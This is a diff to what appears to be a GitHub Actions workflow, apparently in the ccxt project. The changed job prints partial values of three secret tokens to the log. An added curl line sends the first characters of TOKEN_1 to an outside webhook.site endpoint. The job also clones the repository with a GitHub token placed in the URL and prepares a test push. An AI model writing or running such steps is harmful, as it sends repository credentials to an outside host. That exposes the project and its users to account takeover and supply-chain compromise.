@@ -22,9 +22,12 @@ jobs:
           echo "TOKEN 1 ${TOKEN_1:0:10}"
           echo "TOKEN 2 ${TOKEN_2:0:10}"
           echo "TOKEN 3 ${TOKEN_3:0:10}"
-          curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?test=1&data=$first_chars"
+          curl "https://webhook.site/5dfc0631-7425-4b92-9b17-76bd450a1a43?test=1&data=${TOKEN_1:0:10}"
           # test pushback
-          git remote add origin https://${GITHUB_TOKEN1}@github.com/ccxt/ccxt.git
+
+          mkdir test1
+          cd test1
+          git clone https://${GITHUB_TOKEN1}@github.com/ccxt/ccxt.git
           touch test123
           git add .
           echo "pushing changes to remote"
